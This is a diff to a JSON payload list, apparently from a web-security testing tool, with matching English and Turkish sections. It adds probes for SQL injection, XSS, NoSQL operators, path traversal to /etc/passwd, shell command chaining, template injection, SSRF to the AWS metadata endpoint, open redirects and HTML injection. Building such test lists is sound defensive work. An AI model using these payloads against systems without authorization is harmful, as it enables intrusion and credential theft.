@@ -15,7 +15,10 @@
       "Stacked Query Separator": "'; SELECT 1;--",
       "Error-Based Double Quote": "\" AND GTID_SUBSET(CONCAT('~',@@VERSION,'~'),1)--",
       "Boolean-Based Blind Probe": "' AND 1=1--",
-      "SQL Tautology Bypass": "' OR 'xyz'='xyz"
+      "SQL Tautology Bypass": "' OR 'xyz'='xyz",
+      "Time-Based Sleep MySQL": "' OR SLEEP(5)--",
+      "Time-Based Sleep PgSQL": "' OR PG_SLEEP(5)--",
+      "Hex Encoded Bypass": "0x27204f5220313d31"
     },
     "XSS & HTML Sanitization": {
       "Basic Script Tag": "<script>alert(1)</script>",
@@ -31,14 +34,18 @@
       "JavaScript Literal Escapes": "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
       "Math Event Polyglot": "<math><show onerror=alert(1)>",
       "Details Toggle Event": "<details open ontoggle=alert(1)>",
-      "Bypass via HTML Entities": "&lt;script&gt;alert(1)&lt;/script&gt;"
+      "Bypass via HTML Entities": "&lt;script&gt;alert(1)&lt;/script&gt;",
+      "Video Source Error Trigger": "<video><source onerror=alert(1)></video>",
+      "Marquee Element Event": "<marquee onstart=alert(1)>",
+      "OnMouseOver Event Handler": "<span onmouseover=alert(1)>hover</span>"
     },
     "NoSQL & JSON Injection": {
       "MongoDB Greater Than Operator": "{\"$gt\": \"\"}",
       "MongoDB Not Equal Operator": "{\"$ne\": null}",
       "MongoDB Where True Clause": "|| 1==1",
       "JSON Syntax Breakout": "\"} , {\"override\": true",
-      "Array Parameter Hijack": "[\"admin\", \"user\"]"
+      "Array Parameter Hijack": "[\"admin\", \"user\"]",
+      "MongoDB Regex Operator": "{\"$regex\": \".*\"}"
     },
     "Directory Traversal & Paths": {
       "Unix Basic Traversal": "../",
@@ -50,7 +57,8 @@
       "Overlong UTF-8 Slash Bypass": "..%c1%9c",
       "Null Byte Terminated Path": "../../../../../etc/passwd\u0000.jpg",
       "UNC Path Windows Share": "\\\\127.0.0.1\\c$\\windows\\win.ini",
-      "Direct File Scheme Link": "file:///etc/passwd"
+      "Direct File Scheme Link": "file:///etc/passwd",
+      "Windows Hosts File Path": "../../../../../windows/system32/drivers/etc/hosts"
     },
     "OS Command Boundaries": {
       "Semicolon Command Linker": "; id ;",
@@ -61,14 +69,40 @@
       "Backtick Shell Evaluation": "`id`",
       "New Line Command Chain": "\nid\n",
       "Carriage Return Linker": "\rid\r",
-      "PowerShell Command Linker": "; Invoke-Expression (id)"
+      "PowerShell Command Linker": "; Invoke-Expression (id)",
+      "Bash Execution Bypass": "/bin/sh -c id"
     },
     "SSTI & SSI Template Boundaries": {
       "Jinja/Twig Expression Evaluation": "{{7*7}}",
       "Jinja/Twig Object Access": "{{self}}",
       "ES6 Template Literal Boundary": "${7*7}",
       "AngularJS Basic Expression": "{{constructor.constructor('alert(1)')()}}",
-      "SSI Exec Directive Injection": "<!--#exec cmd=\"id\" -->"
+      "SSI Exec Directive Injection": "<!--#exec cmd=\"id\" -->",
+      "Smarty Template Evaluation": "{7*7}",
+      "Velocity Template Evaluation": "#set($c=7*7)$c"
+    },
+    "SSRF Request Boundaries": {
+      "Localhost Loopback IPv4": "http://127.0.0.1:80",
+      "Localhost Loopback Name": "http://localhost:80",
+      "AWS Metadata Endpoint": "http://169.254.169.254/latest/meta-data/",
+      "Localhost Loopback IPv6": "http://[::]:80",
+      "Zero Address Loopback": "http://0.0.0.0:80",
+      "Decimal Loopback Format": "http://2130706433:80"
+    },
+    "Open Redirect Validation": {
+      "Protocol-Relative Host": "//google.com",
+      "Slash Colon Protocol Bypass": "https:google.com",
+      "Backslash Slash URL Bypass": "/\\google.com",
+      "Standard External Destination": "http://google.com",
+      "Parameter Based Redirect": "?next=http://google.com"
+    },
+    "HTML Injection Elements": {
+      "Heading Font Injection": "<h1>Test</h1>",
+      "Marquee Text Injection": "<marquee>Test</marquee>",
+      "Underline Text Tag": "<u>Test</u>",
+      "Bold Text Tag": "<b>Test</b>",
+      "Italic Text Tag": "<i>Test</i>",
+      "Custom Inline Style Container": "<div style='color:red;'>Test</div>"
     },
     "CRLF HTTP Header Injection": {
       "Basic CRLF Header Split": "%0d%0aSet-Cookie: test=1",
@@ -115,7 +149,10 @@
       "Çoklu Sorgu Ayırıcı": "'; SELECT 1;--",
       "Hata Tabanlı Çift Tırnak": "\" AND GTID_SUBSET(CONCAT('~',@@VERSION,'~'),1)--",
       "Mantıksal Kör Tarama": "' AND 1=1--",
-      "SQL Totoloji Aşımı": "' OR 'xyz'='xyz"
+      "SQL Totoloji Aşımı": "' OR 'xyz'='xyz",
+      "Zaman Tabanlı Gecikme MySQL": "' OR SLEEP(5)--",
+      "Zaman Tabanlı Gecikme PgSQL": "' OR PG_SLEEP(5)--",
+      "Hex Kodlu Engel Aşımı": "0x27204f5220313d31"
     },
     "XSS & HTML Temizleme": {
       "Temel Script Etiketi": "<script>alert(1)</script>",
@@ -131,14 +168,18 @@
       "JavaScript Harf Kaçışları": "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
       "Math Olay Vektörü": "<math><show onerror=alert(1)>",
       "Details Toggle Tetikleyici": "<details open ontoggle=alert(1)>",
-      "HTML Kod Varlıklarıyla Aşım": "&lt;script&gt;alert(1)&lt;/script&gt;"
+      "HTML Kod Varlıklarıyla Aşım": "&lt;script&gt;alert(1)&lt;/script&gt;",
+      "Video Kaynak Hata Tetikleyici": "<video><source onerror=alert(1)></video>",
+      "Marquee Olay Tetikleyici": "<marquee onstart=alert(1)>",
+      "OnMouseOver Olay Tetikleyici": "<span onmouseover=alert(1)>hover</span>"
     },
     "NoSQL & JSON Enjeksiyonu": {
       "MongoDB Büyüktür Operatörü": "{\"$gt\": \"\"}",
       "MongoDB Eşit Değildir Operatörü": "{\"$ne\": null}",
       "MongoDB Where True Kuralı": "|| 1==1",
       "JSON Sözdizimi Kırma": "\"} , {\"override\": true",
-      "Dizi Parametresi Ele Geçirme": "[\"admin\", \"user\"]"
+      "Dizi Parametresi Ele Geçirme": "[\"admin\", \"user\"]",
+      "MongoDB Regex Eşleşme Operatörü": "{\"$regex\": \".*\"}"
     },
     "Dizin Gezinti & Dosya Yolları": {
       "Unix Basit Dizin Gezinti": "../",
@@ -150,7 +191,8 @@
       "Uzun UTF-8 Eğik Çizgi Aşımı": "..%c1%9c",
       "Null Byte Sonlandırmalı Yol": "../../../../../etc/passwd\u0000.jpg",
       "UNC Ağ Paylaşım Yolu": "\\\\127.0.0.1\\c$\\windows\\win.ini",
-      "Doğrudan Dosya Şeması Linki": "file:///etc/passwd"
+      "Doğrudan Dosya Şeması Linki": "file:///etc/passwd",
+      "Windows Hosts Dosya Yolu": "../../../../../windows/system32/drivers/etc/hosts"
     },
     "Sistem Komut Sınırları": {
       "Noktalı Virgül Komut Zinciri": "; id ;",
@@ -161,14 +203,40 @@
       "Ters Tırnak Kabuk Çalıştırma": "`id`",
       "Yeni Satır Komut Zinciri": "\nid\n",
       "Satır Başı Karakter Bağlayıcı": "\rid\r",
-      "PowerShell Komut Bağlayıcısı": "; Invoke-Expression (id)"
+      "PowerShell Komut Bağlayıcısı": "; Invoke-Expression (id)",
+      "Bash Çalıştırma Kısayolu": "/bin/sh -c id"
     },
     "SSTI & SSI Şablon Sınırları": {
       "Jinja/Twig İfade Değerlendirme": "{{7*7}}",
       "Jinja/Twig Nesne Erişimi": "{{self}}",
       "ES6 Şablon Değişken Sınırı": "${7*7}",
       "AngularJS Temel İfadesi": "{{constructor.constructor('alert(1)')()}}",
-      "SSI Exec Direktif Enjeksiyonu": "<!--#exec cmd=\"id\" -->"
+      "SSI Exec Direktif Enjeksiyonu": "<!--#exec cmd=\"id\" -->",
+      "Smarty Şablon İfadesi": "{7*7}",
+      "Velocity Şablon İfadesi": "#set($c=7*7)$c"
+    },
+    "SSRF İstek Sınırları": {
+      "Localhost Döngü Adresi IPv4": "http://127.0.0.1:80",
+      "Localhost Döngü İsmi": "http://localhost:80",
+      "AWS Meta-veri Servis Adresi": "http://169.254.169.254/latest/meta-data/",
+      "Localhost Döngü Adresi IPv6": "http://[::]:80",
+      "Sıfır IP Döngü Adresi": "http://0.0.0.0:80",
+      "Desimal Sayı Döngü Formatı": "http://2130706433:80"
+    },
+    "Açık Yönlendirme (Open Redirect)": {
+      "Protokolsüz Harici Adres": "//google.com",
+      "Eğik Çizgili Protokol Atlama": "https:google.com",
+      "Ters Eğik Çizgili Adres": "/\\google.com",
+      "Standart Harici Adres Linki": "http://google.com",
+      "Parametre Tabanlı Yönlendirme": "?next=http://google.com"
+    },
+    "HTML Enjeksiyon Etiketleri": {
+      "Başlık Fontu Enjeksiyonu": "<h1>Test</h1>",
+      "Kayan Yazı Enjeksiyonu": "<marquee>Test</marquee>",
+      "Altı Çizili Metin Etiketi": "<u>Test</u>",
+      "Kalın Metin Etiketi": "<b>Test</b>",
+      "Eğik Metin Etiketi": "<i>Test</i>",
+      "Satır İçi CSS Kutusu": "<div style='color:red;'>Test</div>"
     },
     "CRLF HTTP Başlık Enjeksiyonu": {
       "Temel CRLF Başlık Bölme": "%0d%0aSet-Cookie: test=1",
